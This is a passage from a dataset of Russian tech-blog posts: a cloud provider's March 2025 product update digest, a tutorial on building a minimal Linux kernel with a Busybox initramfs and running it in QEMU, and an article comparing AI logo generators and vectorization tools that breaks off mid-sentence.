50,"Рассказываем об апдейтах за март: месяц бесплатного S3, настройка IOPS и не только",Selectel,IT-инфраструктура для бизнеса,0,"Аппаратное обеспечение, Связь и телекоммуникации, Домены и хостинг",2025-04-10," Привет! Я — Дима, технический писатель в Selectel. Под катом рассказываю, как подключать сетевые диски к нескольким серверам, о новых конфигурациях в DBaaS, а также улучшениях в Kubernetes. В конце — приглашения на апрельские мероприятия.  Используйте навигацию, если не хотите читать текст целиком: → Поддержали Kubernetes 1.32 → Добавили мультиподключение сетевых дисков → Зарелизили новую конфигурацию в DBaaS → Добавили тейнты и метки в K8s on Bare Metal → Запустили лендинг о собственном сервере  → Расширили S3-хранилища до нового региона → Перезапустили акцию с S3-хранилищем → Добавили сетевые диски для кастомных серверов → Зарелизили образы с предустановленными GPU-драйверами → Добавили настройку IOPS при создании ВМ → Увеличили максимальный размер дисков в облаке → Запустили бесплатный курс по сетям → Рассказали, как повысить производительность DBaaS в 10 раз → Приглашаем на мероприятия  Поддержали Kubernetes 1.32 Теперь в Managed Kubernetes доступна версия 1.32. Среди ключевых нововведений — назначение ресурсов на уровне пода, асинхронное вытеснение, новые эндпоинты и нулевое ожидание (sleep) для PreStop-хуков. Также появилась функция для плагинов, которая помогает планировщику K8s повторять попытки планирования.  Подробнее о Managed Kubernetes →    Добавили мультиподключение сетевых дисков Сетевые диски теперь можно подключать к нескольким выделенным серверам одновременно. Это удобно, например, при использовании накопителей в качестве датасторов в виртуальных средах. Серверы и диски объединяются в группы: добавление диска в группу подключает его к серверам, удаление — отключает. В рамках аккаунта доступна только одна группа. Управление через API.   Группа сетевых дисков и выделенных серверов.<  Узнать больше о сетевых дисках →  Зарелизили новую конфигурацию в DBaaS Small — новая конфигурация кластеров в DBaaS на выделенном облачном сервере. Хоть она и «небольшая» по названию, однако обеспечивает высокую производительность:   до 1 500 000/750 000 IOPS на чтение/запись, до 7 000 МБ/с пропускной способности  Мы разворачиваем облако на физическом сервере, ресурсы которого принадлежат только вам.   Топовое железо, а также настройка BIOS и ОС под конкретную БД позволяют добиться максимальной производительности. Для выбора новой конфигурации в панели управления нажмите Продукты, перейдите в раздел Базы данных и нажмите Создать кластер. В поле Конфигурация ноды перейдите во вкладку Dedicated.   Конфигурация Small в панели управления.  Подробнее о DBaaS →  Добавили тейнты и метки в K8s on Bare Metal С марта вы можете использовать тейнты и метки в группах нод на выделенных серверах. Метки помогают идентифицировать ноды разных групп, а тейнты — указывать, где нельзя размещать поды. Доступно как при настройке новых кластеров, так и при управлении существующими.  Подробнее о Kubernetes on Bare Metal →  Запустили лендинг о собственном сервере  Уже слышали про собственный сервер Selectel на базе Intel® Xeon® 6, оперативной памятью до 8 ТБ и специально разработанной материнской платой? На новом лендинге собрали всю информацию о нашей разработке: характеристики, возможности, сценарии использования и не только — заходите посмотреть.   Смотреть страницу →  Расширили S3-хранилища до нового региона Хранение в S3 теперь доступно в Москве (пул ru-7). Это позволит держать данные ближе к части клиентов, повысит производительность Big Data, ML и DWH в случаях, когда compute находится в Москве. А также — хранить бэкапы в разных географических зонах.  Подробнее об S3-хранилище →  Перезапустили акцию с S3-хранилищем Никогда не пользовались объектным хранилищем в Selectel? Самое время попробовать и получить 30 дней бесплатного использования. Заявку можно оставить уже сейчас.  Подать заявку →  Добавили сетевые диски для кастомных серверов Сетевые диски теперь можно подключать к серверам произвольной конфигурации в пуле MSK-1. Решение хорошо подходит для горячих бэкапов, хранения больших объемов данных с быстрым доступом, виртуализации и не только.  Подключить сетевые диски можно двумя способами. Первый вариант заказать новый сервер с дополнительной сетевой картой «2 × 10 GE + подключение к SAN сети Сетевых дисков 10 Гбит/с». Второй — добавить ее к уже существующему серверу произвольной конфигурации.  Также подключить сетевые диски возможно к серверам фиксированной конфигурации с тегом «Можно подключить сетевые диски». При апгрейде уже заказанного сервера возможен даунтайм из-за его перемещения в другую стойку.  Подробнее о сетевых дисках →  Зарелизили образы с предустановленными GPU-драйверами Больше не нужно тратить время на установку драйверов — образы для виртуальных машин с GPU уже готовы к работе. А еще мы обновили инструкцию по самостоятельной установке, чтобы все корректно работало даже после обновления ОС.   Узнать больше о серверах с GPU →  Добавили настройку IOPS при создании ВМ Теперь вы можете задать нужную производительность диска при создании нового облачного сервера. Конфигурация и цена рассчитываются с учетом выбранного IOPS. Для этогов панели управления нажмите Продукты, перейдите в раздел Облачные серверы и нажмите Создать сервер. Далее — выберите тип диска SSD Универсальный v2 и настройте необходимую производительность в IOPS.  Настроить производительность дисков →  Увеличили максимальный размер дисков в облаке Новый лимит на размер локального диска в облачных серверах с произвольной конфигурацией — 2 ТБ. Вы можете самостоятельно создавать ВМ с дисками до этого объема в панели управления или через Terraform.  Протестировать произвольные конфигурации →  Запустили бесплатный курс по сетям Новый курс поможет изучить основы компьютерных сетей, разобраться в принципах их работы, понять ключевые термины и уверенно ориентироваться в основах. На изучение уйдет всего час. Подходит новичкам, которые хотят разобрать тему по полочкам. Но и опытным специалистам будет полезно: с этими материалами вы восполните пробелы в знаниях и вспомните все, что забылось со временем.  Начать обучение →   Рассказали, как повысить производительность DBaaS в 10 раз На практических примерах и расчетах показали, как в 10 раз увеличить производительность баз данных и сократить расходы на инфраструктуру почти вполовину.  Смотреть запись →   Приглашаем на мероприятия Selectel Network MeetUp #12: неизданное 10 апреля, 18:00  Ивент для сетевых специалистов. Ответим на горячие вопросы, а также обсудим тестирование функций оборудования, консольные сети, поиск контактов NOC и пентесты.  Зарегистрироваться →  MLечный путь — 2025: знания, опыт, комьюнити 23 апреля, 18:00  Обсудим кейсы, технологии, реальные сложности и решения в области машинного обучения. Будем не только слушать, но и обмениваться мнениями в дискуссиях, челленджах и на питчах проектов. Каждый участник сможет напрямую поговорить с экспертами и получить подробную обратную связь.  Зарегистрироваться →  GPU в облаке: повышаем производительность и сокращаем стоимость инфраструктуры 23 апреля, 12:00  Рассмотрим возможности доступных GPU-карт в облаке, поделимся кейсами подбора инфраструктуры с GPU и покажем шесть способов сокращения расходов.  Зарегистрироваться →  Опубликовали новые тексты Как работать с регионами S3-хранилища из Python Как настроить IOPS под свои задачи Как замораживать серверы и экономить на инфраструктуре "
51,Собираем и запускаем минимальное ядро Linux,Timeweb Cloud,То самое облако,0,Связь и телекоммуникации,2025-04-10,"Однажды на работе техлид порекомендовал мне проштудировать книгу Understanding the Linux Kernel Бове и Чезати. В ней рассмотрена версия Linux 2.6, сильно не дотягивающая до более современной версии 6.0. Но в ней явно ещё много ценной информации. Книга толстая, поэтому на её изучение мне потребовалось немало времени. Занимаясь по ней, я решил настроить такую среду разработки, в которой я мог бы просматривать и изменять новейшую версию ядра Linux — чтобы было ещё интереснее.  Есть и другие статьи, в которых рассказано, как собрать ядро Linux. Но в этой статье я немного иначе организую и подаю информацию.❯ ЭтапыРабота пойдёт в 2 основных этапа:Собираем и запускаем Linux на qemuСобираем и запускаем Linux на qemu с поддержкой пользовательского пространства Busybox Кроме того, через qemu можно подключить отладчик прямо к действующему ядру Linux. Сначала я планировал изучить этот процесс и именно о нём написать статью, но передумал, увидев, что статья получается слишком длинной. Здесь можно почитать о kgdb. Можете сами убедиться – раньше я с ней не работал.❯ Установка qemuБудем работать с эмулятором Qemu, который имитирует железо. Именно на нём будет работать тот Linux, который bs собираем. Для установки выполните:~ sudo apt install qemu qemu-systemСначала я пытался собрать qemu, взяв за основу исходный код, но у него очень много зависимостей, и вскоре я стал понимать, что напрасно теряю время.❯ Клонируем Linux,настраиваем ветку на локальной машинеСначала клонируем репозиторий с Linux.~ git clone https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/Отличная задача, на которой можно протестировать скорость загрузки.~ du --max-depth=1 --block-size=GB | grep linux 6GB     ./linuxЗатем отметим галочкой ту версию, которая нас интересует. Я остановился на 5.19. ~ cd linux # alias gco=""git checkout"" ~ gco v5.19 ~ git branch -M 5.19❯ Собираем LinuxКак вы можете убедиться, весь процесс сборки документирован прямо в дереве исходников Linux, см. readme. Также можно ввести команду make help, и она выведет доступные опции. Ниже я пошагово опишу работу, которую проделал.Очистка (на первый раз не нужна)Избавьтесь от всех устаревших файлов .o, оставшихся предыдущих попыток. Нам это сейчас не нужно, поскольку мы в первый раз приступаем к сборке, однако хорошие привычки не повредит усваивать заблаговременно.~ make mrproperисходникСобираем образ ядраУ ядра множество возможностей — выбирайте те, что вам нравятся. Например, в ядре есть множество драйверов, вам же, вероятно, нужны лишь некоторые из них. Если скомпилировать ядро сразу со всеми драйверами, это даже может привести к отказу некоторых функций. Драйверы – это лишь один пример. Есть подобные возможности, связанные с виртуализацией, файловыми системами и т.д. Много чего конфигурировать! Следовательно, при сборке ядра делается отдельный шаг, на котором вы явно указываете все возможности, которые вам понадобятся, а лишь затем приступаете собственно к сборке.  Если вы выбрали для сборки ядра путь /home/$USER/linux-build, то укажите флаг O (каталог вывода) как показано ниже.~ OUTPUT_DIR=/home/$USER/linux/build # создать файл конфигурации сборки ядра. При этом максимально возможное количество значений # устанавливается в no. В сущности, нужно отключить как можно больше фич,  # так у вас получится компактное ядро. # Если хотите сделать минимальное ядро, воспользуйтесь tinyconfig вместо allnoconfig. # Не представляю, чем они отличаются. ~ make O=$OUTPUT_DIR allnoconfig # Здесь можно просматривать конфигурацию ядра через визуально приятный пользовательский интерфейс. # Тут пока нечего включать. ~ make O=$OUTPUT_DIR menuconfig # Собираем само ядро # Заменяем 8 на столько процессов, сколько поддерживает ваш компьютер. # cat /proc/cpuinfo | grep processor | wc -l. ~ make O=$OUTPUT_DIR -j8На выходе получаем образ ядра --файл bzImage—и убеждаемся, что его размер составляет всего 1,5 МБ.❯ Этап второй: Запускаем Linux на qemuТеперь давайте попробуем запустить при помощи qemu то ядро, которое у нас получилось.В man-подобной справке по qemu достаточно хорошо объяснено, как работают разные флаги.~ OUTPUT_DIR=/home/$USER/linux/build # -nographic в сущности, означает, что мы обходимся одной лишь консолью для последовательного ввода и не нуждаемся в gui/устройстве с дисплеем. # -append позволяет qemu передать следующую строку в качестве командной строки ядра. #     Так можно сконфигурировать ядро в процессе загрузки: #     - console=ttyS0 сообщает ядру, что нужно использовать последовательный порт. #     - earlyprintk=serial,ttyS0 сообщает ядру, что нужно отправлять через последовательный порт информацию логов, чтобы мы могли, опираясь на неё,   #        отлаживать систему после отказов ещё до того, как инициализируется код консоли. Попробуйте от этого избавиться – и увидите, что получится!  # -kernel указывает, какой образ ядра использовать. #  ~ qemu-system-x86_64 -kernel $OUTPUT_DIR/arch/x86/boot/bzImage -nographic -append ""earlyprintk=serial,ttyS0 console=ttyS0""Если нажать ctrl + a, а затем x, то мы покинем экран консоли. Если нажать  ctrl + a, а затем h, то будет выведено меню справки и другие опции.В любом случае, если запустить собранное ядро через qemu, в ядре возникнет паника:Warning: unable to open an initial console. List of all partitions: No filesystem could mount root, tried:  Kernel panic - not syncing: VFS: Unable to mount root fs on unknown-block(0,0)На следующем этапе мы от этой паники избавимся.❯ Обзаводимся BusyboxТеперь у нас есть ядро Linux, но нет ни пользовательского пространства, ни файловой системы. Воспользуемся файловой системой, в которой обеспечена поддержка памятью (initramfs, можете посмотреть эту ссылку Gentoo в качестве тизера). Что-то должно пойти в файловую систему, поскольку мы не хотим, чтобы наше пользовательское пространство пустовало.Именно здесь нам пригодится Busybox. В нём предоставляются такие команды как ls, cd, cp, mv, vim, tar, grep, dhcp, mdev (события горячего подключения устройств к Linux), ifplugd (мониторинг сетевого канала/интерфейса) – всё через маленький двоичный файл. Пожалуй, эти команды не будут такими многофункциональными и разнообразно конфигурируемыми, как их альтернативы, применяемые вне Busybox, но их нам хватит.Посмотрите файл README к исходному коду busybox после того, как скачаете его по ссылке ниже – там всё подробно написано.Переходите по ссылке https://busybox.net/ и забирайте новейшую стабильную версию busybox.❯ Конфигурируем и собираем BusyboxПроцесс такой же, как и при работе с ядром Linux.Посмотрите файл INSTALL file в исходниках к busybox, как только они скачаются. Сначала выбираем желаемую конфигурацию Busybox, а затем приступаем к сборке. ~ cd busybox-1.33.2 ~ mkdir -pv build ~ OUTPUT_DIR=/home/$USER/busybox-1.33.2/build # создаём файл .config, в котором выставлено множество «yes». Получаем # массу возможностей Busybox, может быть, даже больше, чем нам требуется.  # Я недостаточно разбираюсь в теме, чтобы начинать с allnoconfig # поэтому включаю только абсолютный минимум функций – собственно, вот он.  # Возможно, сборка получится и крупнее, чем ядро на 1,5 МБ. Давайте посмотрим  ~ make O=$OUTPUT_DIR defconfig # Открываем конфигурационный UI ~ make O=$OUTPUT_DIR menuconfigКогда конфигурационный пользовательский интерфейс открыт, выбираем в нём ""Settings"" (Настройки) (клавишей ввода), а затем ""Build Busybox as a static binary"" (Собрать Busybox как статический двоичный файл) (клавишей пробела). Дело в том, что в файловой системе пользовательского пространства нашего пустого ядра не будет никаких разделяемых библиотек, поэтому мы можем сразу приступить к работе. Теперь выходим из конфигурационного меню и сохраняем внесённые изменения.Мы готовы приступать к сборке!# введите make help, чтобы просмотреть доступные опции, # но, в сущности, можно включить make all или make busybox. # При первой опции также собирается документация, при второй - только busybox. ~ make O=$OUTPUT_DIR -j8 busyboxИ вот,~ ls -la $OUTPUT_DIR --block-size=KB | grep busybox -rw-r--r--  1 yangwenli yangwenli    2kB Aug 23 15:33 .busybox_unstripped.cmd -rwxr-xr-x  1 yangwenli yangwenli 2694kB Aug 23 15:33 busybox -rwxr-xr-x  1 yangwenli yangwenli 2987kB Aug 23 15:33 busybox_unstripped -rw-r--r--  1 yangwenli yangwenli 2340kB Aug 23 15:33 busybox_unstripped.map -rw-r--r--  1 yangwenli yangwenli  105kB Aug 23 15:33 busybox_unstripped.outДвоичный файл busybox, который мы хотели получить, действительно оказался размером около  2,7 МБ, больше, чем собранное нами ядро. Вариант busybox_unstripped нас не интересует. Он немного крупнее и, очевидно, предназначен для изучения при помощи аналитических инструментов, так, как об этом рассказано в Busybox FAQ.❯ Создаём исходную структуру каталоговСледующие два раздела сильно вдохновлены вики-справкой по Gentoo, которая приводится в Custom Initramfs здесь.Теперь нам предстоит собрать исходную структуру файлов для пользовательского пространства нашего Linux.Нам потребуется убедиться наверняка, что двоичный файл busybox на своём месте. А также предусмотреть init-процесс/скрипт, чтобы настроить наше пользовательское пространство.~ mkdir /home/$USER/initramfs && cd initramfs # создаём ряд базовых каталогов, которые понадобятся нам в нашем пользовательском пространстве Linux  # dev, proc и sys нужны для хранения всякого материала, относящегося к работе ядра – в частности, procfs, sysfs и устройств. # В etc будем хранить заготовки для конфигурации того материала, которым собираемся заняться в будущем. # Из root мы будем действовать. # В bin будут храниться исполняемые файлы. ~ mkdir {bin,dev,etc,proc,root,sys} # busybox также рассчитывает, что в нём будут эти дополнительные каталоги,  # так что давайте создадим их для него ~ mkdir {usr/bin,usr/sbin,sbin} # Мы хотим, чтобы busybox был включён в наш initramfs ~ cp /home/$USER/busybox-1.33.2/build/busybox bin/busybox❯ Создаём init-процесс Теперь давайте создадим init-процесс. В каталоге initramfs создаём файл под названием init~ touch init && chmod +x initИ заполняем его следующим материалом:#!/bin/busybox sh # Получаем busybox, чтобы создать нежёсткие ссылки на команды  /bin/busybox --install -s # Монтируем файловые системы /proc и /sys. # Можете пропустить этот шаг, если хотите. Просто мне показалось, что хорошо бы их иметь. mount -t proc none /proc mount -t sysfs none /sys # Загружаем командную оболочку, которая теперь должна быть мягко связана с busybox exec /bin/sh❯ Создаём initramfs cpioCpio – это инструмент-архиватор. В сущности, это означает, что он берёт набор файлов и каталогов и обратимо преобразует их в единственный файл. Примерно как tar. Не понимаю, почему, но initramfs указывается через cpio, поэтому и его мы должны обязательно использовать, чтобы всё упаковать. Для сжатия воспользуемся gzip.~ find . -print0 | cpio --null --create --verbose --format=newc | gzip --best > ./custom-initramfs.cpio.gz . ./etc ./root ./sys ./dev ./bin ./bin/busybox ./init ./proc cpio: File ./custom-initramfs.cpio.gz grew, 1310720 new bytes not copied ./custom-initramfs.cpio.gz 7824 blocksВот мы и подготовили initramfs, которым собираемся пользоваться!❯ Этап: выполняем Linux на qemu при помощи Busybox (с применением initramfs)Теперь давайте запустим ядро Linux с включённым initramfs!Возьмём команду qemu, приведённую выше, и добавим флаг command from above and add an initrd, указывая таким образом initramfs.~ LINUX_BUILD_DIR=/home/$USER/linux/build ~ INITRAMFS_DIR=/home/$USER/initramfs/custom-initramfs.cpio.gz # В прпинципе, флаг --initrd разрешает Linux использовать тот ram-диск, который мы собрали  ~ qemu-system-x86_64 -kernel $LINUX_BUILD_DIR/arch/x86/boot/bzImage -nographic -append ""earlyprintk=serial,ttyS0 console=ttyS0"" --initrd $INITRAMFS_DIRВероятно, вас расстраивает, что паника ядра до сих пор возникает. Дело в том, что мы до сих пор не включили поддержку initramfs в ядре, а также не предусмотрели ещё пару деталей, необходимых для нормальной работы в нашем пользовательском пространстве.Слегка затронем вопрос о том, как ядро запускает пользовательское пространство, и как оно узнаёт, где найти процесс init. Чтобы запустить работу пользовательского пространства, ядро ищет /init, а затем /sbin/init, /etc/init, /bin/init и, наконец, finally /bin/sh — именно в таком порядке. Я оставил ссылку на исходник. Кроме того, в командной строке здесь. Я разместил файл init по адресу /bin/init.Теперь, наладив поддержку initramfs, давайте соберём ещё одно ядро. Повторите шаги, проделанные выше (когда мы его конфигурировали) и соберите ядро:~ cd /home/$USER/linux ~ make O=$LINUX_BUILD_DIR menuconfigПерейдите в General Setup и найдите там файловую систему Initial RAM, а также диск с оперативной памятью (RAM), затем нажмите «пробел». В самом верху конфигурационного файла также активируйте 64-битное ядро. Если при работе с двоичным файлом Busybox вы воспользуетесь командой file, то увидите, что он собран для архитектуры x86_64. Вы также убедитесь, что это файл в формате elf, поэтому мы должны будем предусмотреть в ядре поддержку и для этого формата. Поскольку мы используем в нашем init-файле нотацию !#, нам и для неё нужно будет обеспечить поддержку.Наконец спуститесь из начала файла к Device Drivers > Character devices > Serial drivers и 8250/16550 и compatible serial support и Console on 8250/16550 и compatible serial port. Эти конфигурационные настройки нужны для того, чтобы использовать последовательный порт в качестве консоли. Подробнее об этом в документации. Если не внести эти изменения, init работать не сможет. Думаю, именно поэтому и нужна последняя строка exec /bin/sh.Теперь соберём ядро:~ make O=$LINUX_BUILD_DIR -j8А потом снова запустим qemu:~ qemu-system-x86_64 -kernel $LINUX_BUILD_DIR/arch/x86/boot/bzImage -nographic -append ""earlyprintk=serial,ttyS0 console=ttyS0 debug"" --initrd $INITRAMFS_DIRИтак, мы сделали себе рабочий Linux. Если у вас достаточно свободного времени, то можете продолжить этот опыт и выстроить на основе проделанной здесь работы ваш собственный дистрибутив.Новости, обзоры продуктов и конкурсы от команды Timeweb.Cloud — в нашем Telegram-канале ↩Опробовать ↩ИсточникиBuild the Linux kernel and busybox and run them on qemuPrepare the environment for developing linux kernel with qemuKernel parameter guideStack Overflow answer about kernel serial console command lineLinux source tree > Documentation > admin-guide > READMEqemu man pageDisplay devices in qemuGentoo wiki > Custom InitramfsLinux source tree > Documentation > admin-guide > init.rstKernel.org > Linux Serial Consol"
52,"Как создать логотип через нейросеть? 10 лучших сервисов, ч. 2",BotHub,"Агрегатор нейросетей: ChatGPT, Claude, Midjourney",0,"Веб-разработка, Программное обеспечение, Веб-сервисы",2025-04-10,"Логотип. Лицо бренда, главная визуальная визитка, его голос среди конкурентов. В 2025-м его можно не рисовать часами вручную, а генерировать.Я протестировал самые популярные современные нейросети, такие как Flux и Midjourney, в создании логотипов, проверил их силы в леттеринге и теперь расскажу вам, какой сервис лучше подойдёт для вашего проекта.И ещё: как превратить растровую картинку в качественный вектор без страданий? Ну что ж, добро пожаловать во вторую часть статьи, где помимо обсуждения генерации логотипов мы затронем не менее захватывающее искусство трассировки. Я к вам с готовым ответом, и сразу предупреждаю — магия тут настоящая.Как создать логотип через нейросеть? 10 лучших сервисов, часть 1 Как создать логотип через нейросеть? 10 лучших сервисов, часть 2 ← вы находитесь здесь.Как векторизовать сгенерированный растровый логотипУ вас есть классный логотип, но он создан в растровом формате — а значит, при увеличении начинает терять чёткость. Давайте посмотрим, как решить эту проблему с помощью программ для векторизации. Как оказалось, качественных инструментов всего два, и каждому из них есть чем похвастаться.Adobe IllustratorС уверенностью можно назвать самым популярным вариантом Adobe Illustrator. Чтобы начать трассировку, открываем исходное изображение с помощью программы или, как вариант, перетаскиваем картинку в открытый документ. Нам понадобится панель Image Trace, отобразим её через Window → Image Trace.Во‑первых, инициализируем трассировку, выбрав подходящий нам режим — полноцветный:Взглянем на ключевые настройки в панели Image Trace:В ❶ Color настраиваем, какое число цветов будет задействовано.❷ Paths задаёт степень детализации векторных элементов: чем больше задать векторных контуров‑путей, тем активнее результат будет соответствовать оригиналу, а чем их меньше — тем более гладкой получится форма, благодаря упрощению мелких деталей.❸ Движок Corners управляет тем, в какой степени программа будет воспроизводить угловатые контуры (правое положение) или, напротив, стремиться сгладить их (левое положение).❹ Наряду с Flux.1 AI, Illustrator тоже позволяет векторизовать простые, линейные градиенты. Движок ❺ Smooth определяет, с какой степенью программа будет стремиться распознать градиент в плавных переходах цветов.❻ Если активировать Transparency, Illustrator будет исключать светлые участки фона из преобразованного изображения. В противном случае на их месте создадутся белые фигуры.❼ Когда все параметры выставлены, финальный аккорд — нажать Expand, чтобы приступить к дальнейшей ручной доработке. Теперь вы можете разгруппировать объект, удалить ненужное и подкорректировать детали.В конце можно выбрать объект и сохранить его в векторном формате (SVG, EPS, AI, PDF), для этого имеется команда File → Export Selection.Vector MagicVector Magic не претендует на звание векторного редактора, её цель — лишь конвертирование растрового изображения в векторное. Программа обладает пошаговым интерфейсом, и здесь я применяю такую последовательность:Загружаем изображение и жмём Далее.Выбираем Расширенный.Выбираем Гибкие цвета, нажимаем Вперёд.В блоке Настройка сегментации обычно выставляю значение немного больше половины. Также Сглаживание артефактов ставлю в положение Сильное. Обе нижние галочки тоже активирую, чтобы увеличить качество обработки.На следующем этапе вы можете объединить сегментации вручную, если что‑то получилось не так, как задумано.На экране Настройка сглаживания ставим все галочки и подстраиваем оба регулятора под изображение — изменения будут видны сразу.После этого, если на изображении есть фон, который нужно убрать, просто щёлкаем по таким фрагментам.Когда всё доведено до блеска, остаётся последний шаг: жмём Сохранение результата и экспортируем векторный файл.Сравнение трассировки Illustrator и Vector MagicVector Magic лучше умеет упрощать формы, а у Illustrator, по сути, при любых настройках будут наблюдаться зазубрины. И это с учётом того, что последняя версия Vector Magic, 1.15, вышла в 2013–2014 году и с тех пор десктопная версия не обновлялась.Щёлкните по изображению, чтобы рассмотреть более детальноПравда, если говорить о градиентах, это всё же конёк Illustrator.Щёлкните по изображению, чтобы рассмотреть более детальноВообще говоря, векторизовать логотип не всегда нужно, а иногда просто и невозможно. Если логотип содержит фотоэлементы, очень сложные градиенты и другие эффекты, то максимум, что с ним получится сделать, — это увеличить в масштабе (через ИИ‑апскейлер) или удалить ненужный фон. Иногда частичная векторизация тоже спасает: можно оставить векторной только текстовые элементы.VectorMindСтоимость подписки: тариф Pro — 19,99 $/мес.Доступ в бесплатном режиме: при регистрации начисляется 30 кредитов, стоимость одной генерации — 1 кредит.Форматы скачиваемого изображения: SVG, PNG.VectorMind — этот универсальный инструмент не просто генерирует и редактирует изображения, он ещё и выполняет роль библиотеки промтов. Просто выберите в меню Explore в левом верхнем углу какую‑нибудь категорию, затем нажмите Create возле изображения — отобразится промт, через который оно было сгенерировано. Для создания лого можно поизучать разделы логотипов и леттеринга.Генерируем логотипЯ применил тот же запрос со «Скидкочипом», но немного изменил ключи, чтобы логотип не так походил на иконку приложения. В случае VectorMind тоже обозначился вопрос локализации, поэтому я сразу возвращаюсь к латинице.deals company logo, price tag, microchip, and shopping cart symbols, white background, modern playful design, pink green gradient, text ""Skidkochip"" in bold modern fontПотребовалось примерно десять попыток — и вот что получилось:Сохранённый PNG‑файлНадпись продублировалась (что это за мистический «призрак» с идентичным шрифтом и подсветкой мне выдало уже второй раз?), но её легко удалить в Photoshop.Теперь самое неожиданное: несмотря на заявленную векторность, генерации VectorMind не совсем соответствуют этой характеристике. Если вы скачаете изображение в двух форматах — PNG и SVG, то сразу заметите артефакты превращения, которые неожиданно ломают геометрию. Что это значит для нас? Лучше векторизовать эти PNG‑изображения самостоятельно — с помощью инструментов, о которых мы говорили ранее.Сохранённый SVG‑файлВпереди у нас нейросети, работающие с растровыми форматами, и это значит, что методы векторизации вам снова пригодятся. Мы рассмотрим четыре графические нейросети, в которых можно генерировать логотипы: Flux-1.1-Pro, Midjourney-6.1, Dalle-3 и Stable Diffusion 3. Я буду тестировать их в агрегаторе нейросетей BotHub, где можно генерировать картинки поштучно, не заморачиваясь с ежемесячными подписками.Попробуйте сами: зарегистрируйтесь в BotHub по этой специальной ссылке и получите 100 000 токенов для доступа к любым моделям.Flux-1.1-ProСтоимость изображения: 5,13 ₽.Формат скачиваемого изображения: непрозрачный PNG.Нейросеть Flux, созданная стартапом Black Forest Labs, появилась в августе 2024 года. Она обладает отличными характеристиками в плане обработки промтов, визуального качества и детализации изображений. Многие дизайнеры отмечают, что Flux зачастую обходит Midjourney как в плане понимания того, что хочет изобразить пользователь, так и в реалистичности изображений.В линейке Flux несколько моделей, различающихся размером картинки, степенью проработки и скоростью генерации. Например, Flux-1.1.Pro и Flux-1.1-Pro‑Ultra — самые актуальные модели (Pro‑Ultra генерирует в 2752×1536 пкс), а Flux‑Schnell заточена под скоростную генерацию. Но нам спешить некуда, поэтому будем генерировать в версии Pro.Составляем промтКак я уже упоминал, один из удобных способов создания промта — это описать логотип своими словами в каком‑нибудь чат‑боте, например ChatGPT или DeepSeek, а затем скормить результат графической нейросети.Этот принцип подходит для всех ИИ‑генераторов. Во‑первых, важно указать, «для кого» этот логотип, например: Сгенерируй промты для Flux-1.1-Pro/Midjourney-6.1/Dalle-3/Recraft... У графических нейросетей есть свои особенности — и чат‑боты знают о них немало.Если уже известно, что на логотипе будет изображено, вы можете описать это (Изобрази на логотипе...), а также охарактеризовать сферу деятельности компании (Компания занимается...), её аудиторию, продукты (Компания производит канцтовары) — всё это чат‑бот учтёт при «переработке» в графический промт. Ещё — указать то, какой эффект должен производить логотип на зрителя (Логотип должен быть энергичным, ярким...). Как вариант — оставляем простор для фантазии чат‑бота.Плюс к этому удобно выводить несколько вариантов сразу (Выведи 5/10 промтов) и обозначить длину каждого (Длина промта — 30+ слов). Ну и напоследок — полезно указать на отсутствие фона (Пусть логотипы будут на белом фоне), для некоторых генераторов — английский язык промта (Ключевые слова должны быть на английском).Кстати, оптимальная длина запроса в Flux плавает где‑то на уровне 30 слов — если же сделать его слишком длинными, от 50, то генератор может начать создавать уже что‑то другое. Похоже, это происходит оттого, что вес слова logo из‑за общего количества ключей снижается. Тогда вместо айдентики может быть выдана иллюстрация или даже какой‑нибудь комикс, мем — наличие в промте текстовых строк в кавычках способно подталкивать нейросеть к более текстоориентированным форматам.Генерируем логоПопытка первая — логотип фуд‑блога:Create a bold food blog logo using bold red and gold colors, stylized dumplings with exaggerated expressions, and the phrase «Пельмени правды» in dramatic Cyrillic font.Кириллицу Flux пока не поддерживает на ура, и нейросеть решила, что ей проще перевести название на английский. С точки зрения графики логотип отличнейший, и я уже вижу его не только в шапке блога, но и на витрине заведения. Он отрисован в чётких контурах и сплошных цветах, что довольно‑таки практично для логотипа.Design a pixel‑art style logo for a retro‑themed cafe or digital space called ""Пиксель‑бар"". Incorporate pixelated drinks, game icons, or 8-bit fonts. The style should be nostalgic but polished, using vibrant colors on a crisp white background. The name ""Пиксель‑бар"" should appear in a pixel font, clearly integrated into the logo.С точки зрения передачи английских слов эта нейросеть редко видоизменяет написание на свой лад, точно придерживаясь заданной пользователем строки. Кроме того, в Flux-1.1-Pro гораздо больше шанс получить желаемое уже в первых попытках — обе эти гармоничные композиции оправдывают мнение, что нейросеть лучше угадывает, какого результата хочет добиться пользователь.Не забываем, что Flux мультимодален: в качестве промта подходит не только текстовое описание, но и картинка (например, эскиз или образцы) — как вместе с текстовым запросом, так и отдельно.Midjourney-6.1Стоимость изображения: 3,42 ₽ за четыре варианта изображения (в режиме Relax).Формат скачиваемого изображения: непрозрачный PNG.Midjourney — имя, ставшее синонимом генерации изображений. Нейросеть начала своё триумфальное шествие в июле 2022 года и с тех пор покорила множество творческих душ (попробуйте найти дизайнера, который о ней не слышал).С помощью Midjourney можно создавать качественные иллюстрации, обложки, эмблемы и, конечно, логотипы. Этот генератор отличается продвинутым языком промтов, где пишут не только ключевые слова, но и системные параметры: например, версию модели, степень автоматической оптимизации промта, вес отдельных компонентов и так далее.Язык промтов MidjourneyВот популярные настройки промтов Midjourney, полезные в создании логотипов:--style raw — включает «сырой» стиль Midjourney, без автоматического применения художественных фильтров.--no shadow — убирает тени из изображения, если вы хотите, чтобы логотип выглядел плоским и хорошо смотрелся на белом фоне. К тому же тогда его легче векторизовать. Кстати, после ключа --no можно поместить любые слова и словосочетания, описывающие то, чего не должно быть на изображении.--no background — ещё один параметр, чтобы получить чистый, белый фон (или сделать его максимально нейтральным). Полезно комбинировать с параметром white background/на белом фоне.--no noise — отключает визуальный шум и мелкие текстурные детали.--no gradient — на случай, если ваш логотип должен быть без градиентов.--no 3d — убирает 3D‑эффекты, делает логотип плоским. Ещё один нужный параметр, чтобы получить флэт‑дизайн. Можно комбинировать с ключевыми словами вектор, логотип, иконка и т. д.Важно: системные параметры, начинающиеся с двух дефисов --, нужно располагать в конце промта. Кроме того, если писать несколько негативных --no‑промтов, следует соединять их в одну цепочку, примерно так: --no background, gradient, noise.Что касается текстовой части, все фрагменты промта, написанные в машинописных кавычках, — ""Это надпись"", ""Это ещё одна надпись"" — нейросеть постарается встроить в изображение.Оператор ::Если разделить части промта знаком ::, можно будет менять «вес» каждой из них. На старте приоритет ключевых слов распределён равномерно и равен числу 1.0, но с помощью этого оператора его можно как приподнять (указав число выше 1.0, например 1.3 или 